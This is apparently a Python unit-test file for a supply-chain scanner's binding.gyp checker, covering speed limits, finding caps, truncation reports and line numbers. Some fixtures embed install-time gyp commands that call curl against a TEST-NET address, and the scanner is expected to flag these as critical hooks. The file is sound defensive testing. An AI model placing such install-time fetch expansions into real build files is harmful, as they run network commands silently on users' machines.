"""Review fix: scan_gyp was quadratic, went silently blind past its node cap
and reported actions on the wrong line.

* Every SC-INSTALL-HOOK finding re-ran the whole file's PEM scan and
  redacted its snippet lines again, and located its line by scanning every
  line: 2,000 / 4,000 / 8,000 actions took 0.83 / 3.24 / 11.4 s. Expansions
  in ONE string were not bounded by the node cap and each scanned the rest
  of the string for its closing parenthesis: 1,000 / 2,000 / 4,000 in a
  60 KB value took 1.8 / 7.1 / 29.5 s. Lines are now computed once, each
  line redacted once, closing parentheses found in one pass, the command
  text examined per file bounded, and at most GYP_MAX_HOOK_FINDINGS
  findings listed, then one that sums up the rest at the highest severity
  among them.
* The walk stopped after _GYP_MAX_NODES values without a word: an action
  ['echo', 'marker'] was reported, but not once `'variables': {'list':
  ['v'] * 100000}` came first. A walk stopped by a bound is SC-TRUNCATED.
* An action's line was the first line holding ANY token of its command
  (line 2, the target named 'echo', instead of the action on line 6). It
  is now the line of the action's own "action" key (the last one, when a
  dict repeats the key, as the parser keeps the last value).
Inputs are inert strings (echo, marker, TEST-NET hosts)."""

import json
import time
import unittest

from tests import _support  # noqa: F401
from lazaret.scanner import core

LIMIT = 8.0


def actions(n):
    rows = ",\n".join("    {'action_name': 'a', 'action': ['t%06d']}" % i for i in range(n))
    return "{'targets': [{'target_name': 'x', 'actions': [\n" + rows + "\n]}]}\n"


def expansions(n, cmd="echo base64"):
    return "{'variables': {'v': '" + ("<!(%s)" % cmd) * n + "'}}"


def brief(issues):
    return [(i["rule"], i["line"], i["sev"]) for i in issues]


class GypPerfTests(unittest.TestCase):
    CASES = {
        "8,000 actions (11.4 s)": actions(8000),
        "4,000 expansions in one string (29.5 s)": expansions(4000),
        "80,000 expansions in one string": expansions(80000),
        "20,000 unclosed expansions in one string": "{'v': '" + "<!(" * 20000 + "curl x'}",
    }

    def test_each_case_is_fast(self):
        for label, text in self.CASES.items():
            with self.subTest(case=label):
                t = time.monotonic()
                core.scan_gyp("binding.gyp", text)
                self.assertLess(time.monotonic() - t, LIMIT, label)


class GypFindingCapTests(unittest.TestCase):
    def test_many_actions_are_listed_in_part(self):
        issues = core.scan_gyp("binding.gyp", actions(500))
        hooks = [i for i in issues if i["rule"] == "SC-INSTALL-HOOK"]
        self.assertEqual(len(hooks), core.GYP_MAX_HOOK_FINDINGS + 1)
        listed, summary = hooks[:-1], hooks[-1]
        self.assertEqual([i["line"] for i in listed], list(range(2, 2 + core.GYP_MAX_HOOK_FINDINGS)))
        self.assertEqual((summary["sev"], summary["line"]), ("MAJOR", 2 + core.GYP_MAX_HOOK_FINDINGS))
        self.assertEqual(summary["msg"], "400 more binding.gyp actions and command expansions run code at "
                                         "install time (0 of them look hostile); only the first "
                                         "100 are listed.")
        self.assertNotIn("cmd", summary)

    def test_the_summary_keeps_the_highest_severity(self):
        text = actions(150).replace("['t000140']", "['curl', 'http://192.0.2.1/x']")
        summary = [i for i in core.scan_gyp("binding.gyp", text) if i["rule"] == "SC-INSTALL-HOOK"][-1]
        self.assertEqual(summary["sev"], "CRITICAL")
        self.assertIn("50 more binding.gyp actions", summary["msg"])
        self.assertIn("(1 of them look hostile)", summary["msg"])

    def test_expansions_count_too(self):
        issues = core.scan_gyp("binding.gyp", expansions(250, "curl -s http://192.0.2.1/x"))
        self.assertEqual(brief(issues)[-1], ("SC-INSTALL-HOOK", 1, "CRITICAL"))
        self.assertEqual(len(issues), core.GYP_MAX_HOOK_FINDINGS + 1)
        self.assertTrue(issues[-1]["msg"].startswith("150 more binding.gyp actions and command expansions"))


class GypTruncationTests(unittest.TestCase):
    def test_a_walk_stopped_by_the_node_cap_is_truncated(self):
        base = {"targets": [{"target_name": "x", "actions": [{"action_name": "a", "action": ["echo", "marker"]}]}]}
        self.assertEqual(brief(core.scan_gyp("binding.gyp", repr(base))), [("SC-INSTALL-HOOK", 1, "MAJOR")])
        big = dict(base, variables={"list": ["v"] * 100000})
        issues = core.scan_gyp("binding.gyp", repr(big))
        self.assertEqual([(i["rule"], i["sev"], i["msg"]) for i in issues if i["rule"] == "SC-TRUNCATED"],
                         [("SC-TRUNCATED", "CRITICAL",
                           "File not fully scanned: more than 100000 values in the gyp document.")])

    def test_command_text_is_bounded(self):
        issues = core.scan_gyp("binding.gyp", "{'v': '" + "<!(" * 20000 + "curl x'}")
        self.assertEqual(issues[-1]["msg"],
                         "File not fully scanned: more than 2000000 characters of gyp commands.")
        self.assertLess(len(issues), 60)

    def test_a_small_document_is_not_truncated(self):
        self.assertNotIn("SC-TRUNCATED", {i["rule"] for i in core.scan_gyp("binding.gyp", actions(20))})


class GypLineTests(unittest.TestCase):
    def test_an_action_is_reported_on_its_own_line(self):
        text = ("{\n 'targets': [{\n  'target_name': 'echo',\n  'sources': ['marker.cc'],\n"
                "  'actions': [{\n   'action_name': 'gen', 'action': ['echo', 'marker']}]}]}\n")
        self.assertEqual(brief(core.scan_gyp("binding.gyp", text)), [("SC-INSTALL-HOOK", 6, "MAJOR")])

    def test_json_and_literal_forms(self):
        data = {"targets": [{"target_name": "echo", "actions": [
            {"action_name": "a", "action": ["echo", "one"]}, {"action": ["echo", "two"]}]}]}
        text = json.dumps(data, indent=2)
        want = [i + 1 for i, line in enumerate(text.split("\n")) if '"action"' in line]
        self.assertEqual([i["line"] for i in core.scan_gyp("binding.gyp", text)], want)
        # a comment, a repeated key (the parser keeps the last), a parenthesized
        # and a concatenated key, a triple-quoted string with CR line breaks
        text = ("# c\n{'targets': [{'x': '''a\rb\r\nc''',\n 'action': ['echo', 'first'],\n"
                " 'action': ['echo', 'second']},\n {('action'): ['echo', 'third']},\n"
                " {'act'\n  'ion': ['echo', 'fourth']}]}\n")
        found = sorted((i["line"], i["cmd"]) for i in core.scan_gyp("binding.gyp", text))
        self.assertEqual(found, [(5, "echo second"), (6, "echo third"), (7, "echo fourth")])

    def test_expansions_keep_the_first_line_holding_the_command(self):
        text = "{'a': 'x',\n 'b': ['<!(curl -s http://192.0.2.1/x)'],\n 'c': '<!(curl -s http://192.0.2.1/x)'}\n"
        self.assertEqual(brief(core.scan_gyp("binding.gyp", text)),
                         [("SC-INSTALL-HOOK", 2, "CRITICAL"), ("SC-INSTALL-HOOK", 2, "CRITICAL")])


if __name__ == "__main__":
    unittest.main()
